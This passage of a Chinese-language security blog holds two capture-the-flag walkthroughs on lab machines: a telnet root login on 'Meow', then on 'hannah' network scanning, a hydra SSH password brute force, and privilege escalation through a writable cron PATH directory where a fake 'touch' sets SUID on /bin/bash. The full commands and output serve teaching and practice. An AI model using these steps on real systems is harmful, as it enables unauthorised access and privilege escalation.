class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># telnet 10.129.1.17      </span></span><br><span class="line">Trying <span class="number">10.129</span>.<span class="number">1.17</span>...</span><br><span class="line">Connected to <span class="number">10.129</span>.<span class="number">1.17</span>.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line"></span><br><span class="line">  █  █         ▐▌     ▄█▄ █          ▄▄▄▄</span><br><span class="line">  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀</span><br><span class="line">  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Meow login: root</span><br><span class="line">Welcome to Ubuntu <span class="number">20.04</span>.<span class="number">2</span> LTS (GNU/Linux <span class="number">5.4</span>.<span class="number">0</span><span class="literal">-77-generic</span> x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri <span class="number">28</span> Jul <span class="number">2023</span> <span class="number">01</span>:<span class="number">37</span>:<span class="number">37</span> PM UTC</span><br><span class="line"></span><br><span class="line">  System load:           <span class="number">0.0</span></span><br><span class="line">  Usage of /:            <span class="number">41.7</span>% of <span class="number">7.75</span>GB</span><br><span class="line">  Memory usage:          <span class="number">4</span>%</span><br><span class="line">  Swap usage:            <span class="number">0</span>%</span><br><span class="line">  Processes:             <span class="number">138</span></span><br><span class="line">  Users logged <span class="keyword">in</span>:       <span class="number">0</span></span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: <span class="number">10.129</span>.<span class="number">1.17</span></span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::<span class="number">250</span>:<span class="number">56</span>ff:fe96:f100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">75</span> updates can be applied immediately.</span><br><span class="line"><span class="number">31</span> of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list <span class="literal">--upgradable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">Last login: Mon Sep  <span class="number">6</span> <span class="number">15</span>:<span class="number">15</span>:<span class="number">23</span> UTC <span class="number">2021</span> from <span class="number">10.10</span>.<span class="number">14.18</span> on pts/<span class="number">0</span></span><br><span class="line">root@Meow:~<span class="comment"># ls</span></span><br><span class="line">flag.txt  snap</span><br><span class="line">root@Meow:~<span class="comment"># cat flag.txt</span></span><br><span class="line">b40abdfe23665f766f9c61ecba8a4c19</span><br><span class="line">root@Meow:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/28/htb-1/" data-id="clmnr8k0d000iso8g0p3i69ta" data-title="htb_1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hannah" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/28/hannah/" class="article-date">
  <time class="dt-published" datetime="2023-07-28T02:53:59.000Z" itemprop="datePublished">2023-07-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/28/hannah/">hannah</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-扫描网段"><a href="#1-扫描网段" class="headerlink" title="1.扫描网段"></a>1.扫描网段</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># arp-scan -l --interface=eth1</span></span><br><span class="line">Interface: eth1, <span class="built_in">type</span>: EN10MB, MAC: <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">4</span>d:<span class="number">2</span>f:<span class="number">15</span>, IPv4: <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee<span class="literal">-oui</span>.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac<span class="literal">-vendor</span>.txt: Permission denied</span><br><span class="line">Starting arp<span class="literal">-scan</span> <span class="number">1.10</span>.<span class="number">0</span> with <span class="number">256</span> hosts (https://github.com/royhills/arp<span class="literal">-scan</span>)</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">0</span>a:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>a       (Unknown: locally administered)</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.100</span>  <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">28</span>:<span class="number">10</span>:c8       (Unknown)</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.134</span>  <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">7</span>a:ae:<span class="built_in">cd</span>       (Unknown)</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> packets received by <span class="keyword">filter</span>, <span class="number">0</span> packets dropped by kernel</span><br><span class="line">Ending arp<span class="literal">-scan</span> <span class="number">1.10</span>.<span class="number">0</span>: <span class="number">256</span> hosts scanned <span class="keyword">in</span> <span class="number">1.850</span> seconds (<span class="number">138.38</span> hosts/sec). <span class="number">3</span> responded</span><br></pre></td></tr></table></figure>

<h2 id="2-扫描端口服务"><a href="#2-扫描端口服务" class="headerlink" title="2.扫描端口服务"></a>2.扫描端口服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap  -sC -sV 192.168.56.134 -p0-65535</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-28</span> <span class="number">14</span>:<span class="number">03</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.134</span></span><br><span class="line">Host is up (<span class="number">0.00080</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp  open  ssh     OpenSSH <span class="number">8.4</span>p1 Debian <span class="number">5</span>+deb11u1 (protocol <span class="number">2.0</span>)</span><br><span class="line">|_auth<span class="literal">-owners</span>: root</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">3072</span> <span class="number">5</span>f1c78369905320982d3d5054c1475d1 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">0669</span>ef979b34d7f3c79660d1a1ffd82c (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">853</span>dda74b2684ea6f7e5f58540902e9a (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp  open  http    nginx <span class="number">1.18</span>.<span class="number">0</span></span><br><span class="line">| http<span class="literal">-robots</span>.txt: <span class="number">1</span> disallowed entry </span><br><span class="line">|_/enlightenment</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_auth-owners: moksha</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.18.0</span></span><br><span class="line"><span class="string">113/tcp open  ident?</span></span><br><span class="line"><span class="string">|_auth-owners: root</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:7A:AE:CD (Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 82.61 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="3-查看一下网页"><a href="#3-查看一下网页" class="headerlink" title="3.查看一下网页"></a>3.查看一下网页</h2><p><img src="/../pic/image-20230728141534733.png" alt="image-20230728141534733"></p>
<p>啥都没有？？？</p>
<h2 id="4-扫描目录"><a href="#4-扫描目录" class="headerlink" title="4.扫描目录"></a>4.扫描目录</h2><p>dirsearch比较快，试一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://192.168.56.134/     </span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.2</span>                                                                                                                  </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                           </span><br><span class="line">                                                                                                                                                  </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">30</span> | Wordlist size: <span class="number">10927</span></span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/<span class="number">192.168</span>.<span class="number">56.134</span>/<span class="literal">-_23-07-28_14-24-24</span>.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors<span class="literal">-23-07-28_14-24-24</span>.log</span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">192.168</span>.<span class="number">56.134</span>/</span><br><span class="line"></span><br><span class="line">[<span class="number">14</span>:<span class="number">24</span>:<span class="number">24</span>] Starting: </span><br><span class="line">[<span class="number">14</span>:<span class="number">24</span>:<span class="number">50</span>] <span class="number">200</span> -   <span class="number">19</span>B  - /index.html                                       </span><br><span class="line">[<span class="number">14</span>:<span class="number">25</span>:<span class="number">02</span>] <span class="number">200</span> -   <span class="number">25</span>B  - /robots.txt                                       </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed             </span><br></pre></td></tr></table></figure>

<h2 id="5-访问一下robots-txt"><a href="#5-访问一下robots-txt" class="headerlink" title="5.访问一下robots.txt"></a>5.访问一下robots.txt</h2><p><img src="/../pic/image-20230728142843005.png" alt="image-20230728142843005"></p>
<p>但是这里我们已经别无他法，hydra爆破准备</p>
<h2 id="6-hydra爆破"><a href="#6-hydra爆破" class="headerlink" title="6.hydra爆破"></a>6.hydra爆破</h2><p>上述结果已经说明用户为moksha</p>
<p>试一下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># hydra ssh://192.168.56.134 -l moksha -P /usr/share/wordlists/rockyou.txt -f -v</span></span><br><span class="line">Hydra v9.<span class="number">4</span> (c) <span class="number">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non<span class="literal">-binding</span>, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser<span class="literal">-thc</span>/thc<span class="literal">-hydra</span>) starting at <span class="number">2023</span><span class="literal">-07-28</span> <span class="number">14</span>:<span class="number">36</span>:<span class="number">28</span></span><br><span class="line">[<span class="type">WARNING</span>] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="literal">-t</span> <span class="number">4</span></span><br><span class="line">[<span class="type">DATA</span>] max <span class="number">16</span> tasks per <span class="number">1</span> server, overall <span class="number">16</span> tasks, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[<span class="type">DATA</span>] attacking ssh://<span class="number">192.168</span>.<span class="number">56.134</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="type">VERBOSE</span>] Resolving addresses ... [<span class="type">VERBOSE</span>] resolving done</span><br><span class="line">[<span class="type">INFO</span>] Testing <span class="keyword">if</span> password authentication is supported by ssh://moksha@<span class="number">192.168</span>.<span class="number">56.134</span>:<span class="number">22</span></span><br><span class="line">[<span class="type">INFO</span>] Successful, password authentication is supported by ssh://<span class="number">192.168</span>.<span class="number">56.134</span>:<span class="number">22</span></span><br><span class="line">[<span class="type">ERROR</span>] could not connect to target port <span class="number">22</span>: Socket error: disconnected</span><br><span class="line">[<span class="type">ERROR</span>] ssh protocol error</span><br><span class="line">[<span class="type">ERROR</span>] could not connect to target port <span class="number">22</span>: Socket error: Connection reset by peer</span><br><span class="line">[<span class="type">ERROR</span>] ssh protocol error</span><br><span class="line">[<span class="type">ERROR</span>] could not connect to target port <span class="number">22</span>: Socket error: Connection reset by peer</span><br><span class="line">[<span class="type">ERROR</span>] ssh protocol error</span><br><span class="line">[<span class="type">VERBOSE</span>] Disabled child <span class="number">8</span> because of too many errors</span><br><span class="line">[<span class="type">VERBOSE</span>] Disabled child <span class="number">15</span> because of too many errors</span><br><span class="line">[<span class="type">ERROR</span>] could not connect to target port <span class="number">22</span>: Socket error: Connection reset by peer</span><br><span class="line">[<span class="type">ERROR</span>] ssh protocol error</span><br><span class="line">[<span class="type">VERBOSE</span>] Disabled child <span class="number">9</span> because of too many errors</span><br><span class="line">[<span class="type">VERBOSE</span>] Disabled child <span class="number">14</span> because of too many errors</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">56.134</span>   login: moksha   password: hannah</span><br><span class="line">[<span class="type">STATUS</span>] attack finished <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.134</span> (valid pair found)</span><br><span class="line"><span class="number">1</span> of <span class="number">1</span> target successfully completed, <span class="number">1</span> valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser<span class="literal">-thc</span>/thc<span class="literal">-hydra</span>) finished at <span class="number">2023</span><span class="literal">-07-28</span> <span class="number">14</span>:<span class="number">36</span>:<span class="number">47</span></span><br></pre></td></tr></table></figure>

<p>连接一下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ssh moksha@192.168.56.134         </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.134 (192.168.56.134)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:RZdWDCayN2ZJO5rXaVv2OOemeArZ0UbcRoKCoz9lWzA.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">192.168</span>.<span class="number">56.134</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Load key &quot;/root/.ssh/id_rsa&quot;: error in libcrypto</span></span><br><span class="line"><span class="string">moksha@192.168.56.134&#x27;</span>s password: </span><br><span class="line">Linux hannah <span class="number">5.10</span>.<span class="number">0</span><span class="literal">-20-amd64</span> <span class="comment">#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Jan  <span class="number">4</span> <span class="number">10</span>:<span class="number">45</span>:<span class="number">54</span> <span class="number">2023</span> from <span class="number">192.168</span>.<span class="number">1.51</span></span><br><span class="line">moksha@hannah:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<p>连接成功</p>
<p>获得usr.txt</p>
<h2 id="7-sudo提权"><a href="#7-sudo提权" class="headerlink" title="7.sudo提权"></a>7.sudo提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moksha@hannah:~<span class="variable">$</span> sudo l</span><br><span class="line"><span class="literal">-bash</span>: sudo: orden no encontrada</span><br></pre></td></tr></table></figure>

<p>查找二进制文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">moksha@hannah:~<span class="variable">$</span> find / <span class="literal">-type</span> f <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-ls</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">   <span class="number">137350</span>     <span class="number">52</span> <span class="literal">-rwsr-xr--</span>   <span class="number">1</span> root     messagebus    <span class="number">51336</span> oct  <span class="number">5</span>  <span class="number">2022</span> /usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">   <span class="number">269176</span>    <span class="number">472</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root         <span class="number">481608</span> jul  <span class="number">2</span>  <span class="number">2022</span> /usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">     <span class="number">3763</span>     <span class="number">72</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">71912</span> ene <span class="number">20</span>  <span class="number">2022</span> /usr/bin/su</span><br><span class="line">     <span class="number">3604</span>     <span class="number">44</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">44632</span> feb  <span class="number">7</span>  <span class="number">2020</span> /usr/bin/newgrp</span><br><span class="line">      <span class="number">110</span>     <span class="number">64</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">63960</span> feb  <span class="number">7</span>  <span class="number">2020</span> /usr/bin/passwd</span><br><span class="line">     <span class="number">4132</span>     <span class="number">36</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">35040</span> ene <span class="number">20</span>  <span class="number">2022</span> /usr/bin/umount</span><br><span class="line">      <span class="number">109</span>     <span class="number">88</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">88304</span> feb  <span class="number">7</span>  <span class="number">2020</span> /usr/bin/gpasswd</span><br><span class="line">      <span class="number">107</span>     <span class="number">52</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">52880</span> feb  <span class="number">7</span>  <span class="number">2020</span> /usr/bin/chsh</span><br><span class="line">      <span class="number">106</span>     <span class="number">60</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">58416</span> feb  <span class="number">7</span>  <span class="number">2020</span> /usr/bin/chfn</span><br><span class="line">     <span class="number">4130</span>     <span class="number">56</span> <span class="literal">-rwsr-xr-x</span>   <span class="number">1</span> root     root          <span class="number">55528</span> ene <span class="number">20</span>  <span class="number">2022</span> /usr/bin/<span class="built_in">mount</span></span><br></pre></td></tr></table></figure>

<p>没啥可以利用的</p>
<p>看看其他目录吧</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">moksha@hannah:/etc<span class="variable">$</span> <span class="built_in">cat</span> crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line">* * * * * root touch /tmp/enlIghtenment</span><br><span class="line"><span class="number">17</span> *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run<span class="literal">-parts</span> <span class="literal">--report</span> /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test <span class="literal">-x</span> /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run<span class="literal">-parts</span> <span class="literal">--report</span> /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test <span class="literal">-x</span> /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run<span class="literal">-parts</span> <span class="literal">--report</span> /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test <span class="literal">-x</span> /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run<span class="literal">-parts</span> <span class="literal">--report</span> /etc/cron.monthly )</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>第19行有所提示,touch，那我们可以考虑一下路径劫持</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">moksha@hannah:/<span class="variable">$</span> which touch</span><br><span class="line">/usr/bin/touch</span><br><span class="line">moksha@hannah:/<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">moksha@hannah:/<span class="variable">$</span> grep <span class="string">&quot;PATH&quot;</span> /etc/crontab | tr <span class="literal">-d</span> <span class="string">&quot;PATH=&quot;</span> | sed <span class="string">&quot;s/:/\n/g&quot;</span> | xargs <span class="built_in">ls</span> <span class="literal">-ld</span></span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root     <span class="number">7</span> ene  <span class="number">4</span>  <span class="number">2023</span> /bin -&gt; usr/bin</span><br><span class="line">drwxrwxrwx <span class="number">3</span> root root  <span class="number">4096</span> ene  <span class="number">4</span>  <span class="number">2023</span> /media</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root     <span class="number">8</span> ene  <span class="number">4</span>  <span class="number">2023</span> /sbin -&gt; usr/sbin</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">2</span> root root <span class="number">20480</span> ene  <span class="number">4</span>  <span class="number">2023</span> /usr/bin</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">2</span> root root  <span class="number">4096</span> ene  <span class="number">4</span>  <span class="number">2023</span> /usr/local/bin</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">2</span> root root  <span class="number">4096</span> ene  <span class="number">4</span>  <span class="number">2023</span> /usr/local/sbin</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">2</span> root root <span class="number">12288</span> ene  <span class="number">4</span>  <span class="number">2023</span> /usr/sbin</span><br></pre></td></tr></table></figure>

<p>media是目标</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">moksha@hannah:/<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;chmod +s /bin/bash&quot;</span> &gt; /media/touch</span><br><span class="line">moksha@hannah:/<span class="variable">$</span> chmod +x /media/touch</span><br><span class="line">moksha@hannah:/<span class="variable">$</span> bash <span class="literal">-p</span></span><br><span class="line">moksha@hannah:/<span class="variable">$</span> <span class="built_in">cd</span> root</span><br><span class="line">bash: <span class="built_in">cd</span>: root: Permiso denegado</span><br><span class="line">moksha@hannah:/<span class="variable">$</span> bash <span class="literal">-p</span></span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">1</span><span class="comment"># ls</span></span><br><span class="line">bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class="line">boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old</span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">1</span><span class="comment"># cd root </span></span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">1</span><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">1</span><span class="comment"># cat root.txt</span></span><br><span class="line">HMVHAPPYNY2023</span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">1</span><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="over"><a href="#over" class="headerlink" title="over."></a>over.</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/28/hannah/" data-id="clmnr8k0f000pso8g6vh12xsu" data-title="hannah" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
